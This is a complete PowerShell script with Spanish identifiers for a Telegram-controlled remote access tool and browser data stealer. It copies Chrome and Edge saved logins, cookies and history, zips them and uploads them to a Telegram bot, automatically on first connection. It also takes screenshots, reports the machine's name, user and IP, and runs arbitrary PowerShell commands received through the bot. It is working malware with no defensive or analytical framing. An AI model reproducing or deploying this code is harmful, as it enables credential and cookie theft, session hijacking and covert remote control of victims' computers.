param(
    [Parameter(Mandatory=$true)]
    [string]$Token,
    
    [Parameter(Mandatory=$true)]
    [string]$ChatId
)

$ErrorActionPreference = "SilentlyContinue"
$ApiUrl = "https://api.telegram.org/bot$Token"
$LastUpdateId = 0
$Global:EstadoInternet = $false
$Global:PrimeraEjecucion = $true

$LogPath = "$env:APPDATA\CarpetaDos\debug.log"
Start-Transcript -Path $LogPath -Force | Out-Null

Add-Type -AssemblyName System.Windows.Forms | Out-Null
Add-Type -AssemblyName System.Drawing | Out-Null

# ============================================
# FUNCIONES DE UTILIDAD
# ============================================

function Enviar-Mensaje {
    param ($chatId, $texto)
    try {
        $Body = @{ chat_id = $chatId; text = $texto; parse_mode = "Markdown" }
        $json = $Body | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $json | Out-Null
    } catch { 
        Add-Content $LogPath "Error enviando mensaje: $_" 
    }
}

function Enviar-MensajeLargo {
    param ($chatId, $texto)
    $max = 4000
    if ($texto.Length -le $max) {
        Enviar-Mensaje -chatId $chatId -texto $texto
        return
    }
    $partes = [math]::Ceiling($texto.Length / $max)
    for ($i = 0; $i -lt $partes; $i++) {
        $inicio = $i * $max
        $longitud = [math]::Min($max, $texto.Length - $inicio)
        $parte = $texto.Substring($inicio, $longitud)
        Enviar-Mensaje -chatId $chatId -texto "```$parte```"
        Start-Sleep -Milliseconds 500
    }
}

function Enviar-Documento {
    param ($chatId, $rutaArchivo, $titulo)
    try {
        if (-not (Test-Path $rutaArchivo)) { return }
        $file = Get-Item $rutaArchivo
        $uri = "$ApiUrl/sendDocument"
        
        $fileBytes = [System.IO.File]::ReadAllBytes($rutaArchivo)
        $enc = [System.Text.Encoding]::GetEncoding("ISO-8859-1")
        $fileContent = $enc.GetString($fileBytes)
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $body = @(
            "--$boundary",
            'Content-Disposition: form-data; name="chat_id"',
            "",
            $chatId,
            "--$boundary",
            'Content-Disposition: form-data; name="document"; filename="' + $file.Name + '"',
            'Content-Type: application/octet-stream',
            "",
            $fileContent,
            "--$boundary--"
        ) -join "`r`n"
        
        Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body | Out-Null
    } catch { 
        Add-Content $LogPath "Error enviando doc: $_" 
    }
}

function Enviar-Foto {
    param ($chatId, $rutaFoto, $titulo)
    try {
        if (-not (Test-Path $rutaFoto)) { return }
        $uri = "$ApiUrl/sendPhoto"
        
        $bytes = [System.IO.File]::ReadAllBytes($rutaFoto)
        $enc = [System.Text.Encoding]::GetEncoding("ISO-8859-1")
        $content = $enc.GetString($bytes)
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $body = @(
            "--$boundary",
            'Content-Disposition: form-data; name="chat_id"',
            "",
            $chatId,
            "--$boundary",
            'Content-Disposition: form-data; name="photo"; filename="capture.png"',
            'Content-Type: image/png',
            "",
            $content,
            "--$boundary",
            'Content-Disposition: form-data; name="caption"',
            "",
            $titulo,
            "--$boundary--"
        ) -join "`r`n"
        
        Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body | Out-Null
    } catch { 
        Add-Content $LogPath "Error enviando foto: $_" 
    }
}

function Tomar-Captura {
    param ($chatId)
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $ruta = "$env:TEMP\capture_$timestamp.png"
        $bitmap.Save($ruta, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose(); $bitmap.Dispose()
        Enviar-Foto -chatId $chatId -rutaFoto $ruta -titulo "Screenshot - $timestamp"
        Start-Sleep -Seconds 1
        Remove-Item $ruta -Force -ErrorAction SilentlyContinue
    } catch {
        Add-Content $LogPath "Error captura: $_"
        Enviar-Mensaje -chatId $chatId -texto "Error captura"
    }
}

function Copiar-ArchivoBloqueado {
    param ($origen, $destino)
    try {
        if (Test-Path $origen) {
            try {
                Copy-Item $origen $destino -Force
                return $true
            } catch {
                try {
                    $fs = New-Object System.IO.FileStream($origen, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
                    $bytes = New-Object byte[] $fs.Length
                    $fs.Read($bytes, 0, $fs.Length) | Out-Null
                    $fs.Close()
                    [System.IO.File]::WriteAllBytes($destino, $bytes)
                    return $true
                } catch { return $false }
            }
        }
    } catch { return $false }
    return $false
}

function Recolectar-DatosNavegadores {
    param ($chatId, $silencioso = $false)
    
    if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto "Recolectando datos de navegadores..." }
    
    # Rutas específicas de navegadores
    $navegadores = @{
        'Chrome' = @{
            'Base' = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
            'Datos' = @{
                'History' = 'History'
                'Bookmarks' = 'Bookmarks'
                'Cookies' = 'Network\Cookies'
                'Login Data' = 'Login Data'
                'Cache' = 'Cache'
            }
        }
        'Edge' = @{
            'Base' = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
            'Datos' = @{
                'History' = 'History'
                'Bookmarks' = 'Bookmarks'
                'Cookies' = 'Network\Cookies'
                'Login Data' = 'Login Data'
                'Cache' = 'Cache'
            }
        }
    }
    
    $ts = Get-Date -Format "yyyyMMdd_HHmmss"
    $rec = @()
    $resumen = @()
    
    foreach ($nav in $navegadores.Keys) {
        $base = $navegadores[$nav]['Base']
        if (-not (Test-Path $base)) { continue }
        
        foreach ($tipo in $navegadores[$nav]['Datos'].Keys) {
            $archivo = $navegadores[$nav]['Datos'][$tipo]
            $origen = Join-Path $base $archivo
            $nombre = "$($nav)_$($tipo -replace ' ', '_')_$ts"
            
            if ($tipo -eq 'History' -or $tipo -eq 'Login Data' -or $tipo -eq 'Cookies') {
                $ext = 'db'
            } elseif ($tipo -eq 'Bookmarks') {
                $ext = 'json'
            } else {
                $ext = 'cache'
            }
            
            $tmp = "$env:TEMP\$nombre.$ext"
            
            if (Copiar-ArchivoBloqueado $origen $tmp) {
                $rec += $tmp
                $tamano = (Get-Item $tmp).Length
                $resumen += "$nav $tipo ($([math]::Round($tamano/1KB,2)) KB)"
            }
        }
    }
    
    if ($rec.Count -gt 0) {
        $zip = "$env:TEMP\BrowserData_$ts.zip"
        Compress-Archive -Path $rec -DestinationPath $zip -Force
        
        Enviar-Documento -chatId $chatId -rutaArchivo $zip -titulo "Datos Navegadores - $ts"
        
        # Enviar resumen
        $msgResumen = "Datos recolectados:`n" + ($resumen -join "`n")
        if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto $msgResumen }
        
        Remove-Item $zip -Force -ErrorAction SilentlyContinue
        $rec | ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
        
        return $true
    } else {
        if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto "No se encontraron archivos de navegadores" }
        return $false
    }
}

function Probar-Conexion {
    try { 
        Invoke-RestMethod -Uri 'https://api.telegram.org' -Method Head -TimeoutSec 5 | Out-Null
        return $true 
    } catch { 
        return $false 
    }
}

function Obtener-Info {
    try { 
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
        return "PC: $($env:COMPUTERNAME) | User: $($env:USERNAME) | IP: $ip"
    } catch { 
        return "PC: $($env:COMPUTERNAME) | User: $($env:USERNAME)"
    }
}

function Obtener-DirectorioActual {
    return (Get-Location).Path
}

function Ejecutar-Comando {
    param ($comando, $chatId)
    try {
        $dirActual = Obtener-DirectorioActual
        $salida = Invoke-Expression $comando 2>&1 | Out-String
        
        $resultado = "Directorio: $dirActual`n$("="*50)`n$salida"
        
        if ($resultado.Length -gt 4000) {
            Enviar-MensajeLargo -chatId $chatId -texto $resultado
        } else {
            Enviar-Mensaje -chatId $chatId -texto "```$resultado```"
        }
    } catch {
        Enviar-Mensaje -chatId $chatId -texto "Error: $_"
    }
}

function Listar-Directorio {
    param ($chatId)
    try {
        $dirActual = Obtener-DirectorioActual
        $items = Get-ChildItem | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
        
        $resultado = "Directorio: $dirActual`n$("="*50)`n$items"
        Enviar-Mensaje -chatId $chatId -texto "```$resultado```"
    } catch {
        Enviar-Mensaje -chatId $chatId -texto "Error listando directorio: $_"
    }
}

function Cambiar-Directorio {
    param ($ruta, $chatId)
    try {
        Set-Location $ruta -ErrorAction Stop
        $nuevoDir = Obtener-DirectorioActual
        Enviar-Mensaje -chatId $chatId -texto "Directorio cambiado a: $nuevoDir"
    } catch {
        Enviar-Mensaje -chatId $chatId -texto "Error: No se pudo cambiar a '$ruta'"
    }
}

# ============================================
# INICIO DEL BOT
# ============================================

Enviar-Mensaje -chatId $ChatId -texto "Bot iniciado en $(Obtener-Info)"

while ($true) {
    $net = Probar-Conexion
    
    if ($net -and -not $Global:EstadoInternet) {
        $Global:EstadoInternet = $true
        if ($Global:PrimeraEjecucion) {
            $Global:PrimeraEjecucion = $false
            Enviar-Mensaje -chatId $ChatId -texto "Conectado - $(Obtener-Info)`nRecolectando datos automáticamente..."
            Start-Sleep -Seconds 2
            Recolectar-DatosNavegadores -chatId $ChatId -silencioso $true
        }
    } elseif (-not $net) {
        $Global:EstadoInternet = $false
        Start-Sleep -Seconds 10
        continue
    }
    
    try {
        $url = "$ApiUrl/getUpdates?offset=$($LastUpdateId + 1)&limit=5"
        $res = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 20
        
        if ($res.ok -and $res.result.Count -gt 0) {
            foreach ($up in $res.result) {
                $LastUpdateId = $up.update_id
                $msg = $up.message
                if ($msg -and $msg.from.id -eq $ChatId -and $msg.text) {
                    $txt = $msg.text.Trim()
                    $cid = $msg.chat.id
                    $txtLower = $txt.ToLower()
                    
                    # Comando /ls o ls
                    if ($txtLower -eq 'ls' -or $txtLower -eq '/ls') {
                        Listar-Directorio -chatId $cid
                    } 
                    # Comando /cmd <comando>
                    elseif ($txtLower.StartsWith('/cmd ') -or $txtLower.StartsWith('cmd ')) {
                        $c = $txt.Substring($txt.IndexOf(' ') + 1)
                        Ejecutar-Comando -comando $c -chatId $cid
                    } 
                    # Comando /cd <ruta>
                    elseif ($txtLower.StartsWith('/cd ') -or $txtLower.StartsWith('cd ')) {
                        $ruta = $txt.Substring($txt.IndexOf(' ') + 1)
                        Cambiar-Directorio -ruta $ruta -chatId $cid
                    } 
                    # Comando /pwd
                    elseif ($txtLower -eq '/pwd' -or $txtLower -eq 'pwd') {
                        Enviar-Mensaje -chatId $cid -texto "Directorio actual: $(Obtener-DirectorioActual)"
                    } 
                    # Comando /steal
                    elseif ($txtLower -eq 'steal' -or $txtLower -eq '/steal') {
                        Recolectar-DatosNavegadores -chatId $cid
                    } 
                    # Comando /captura
                    elseif ($txtLower -eq 'captura' -or $txtLower -eq '/captura') {
                        Tomar-Captura -chatId $cid
                    } 
                    # Comando /info
                    elseif ($txtLower -eq 'info' -or $txtLower -eq '/info') {
                        Enviar-Mensaje -chatId $cid -texto "$(Obtener-Info)`nDirectorio: $(Obtener-DirectorioActual)"
                    } 
                    # Comando /help
                    elseif ($txtLower -eq 'help' -or $txtLower -eq '/help') {
                        $ayuda = @"
Comandos disponibles:
/ls - Listar archivos en directorio actual
/cmd <comando> - Ejecutar comando PowerShell
/cd <ruta> - Cambiar de directorio
/pwd - Mostrar directorio actual
/steal - Recolectar datos de navegadores
/captura - Tomar screenshot
/info - Información del sistema
/help - Mostrar esta ayuda

Todos los comandos muestran el directorio actual.
"@
                        Enviar-Mensaje -chatId $cid -texto $ayuda
                    }
                }
            }
        }
    } catch { 
        Add-Content $LogPath "Error loop: $_" 
    }
    Start-Sleep -Seconds 1
}
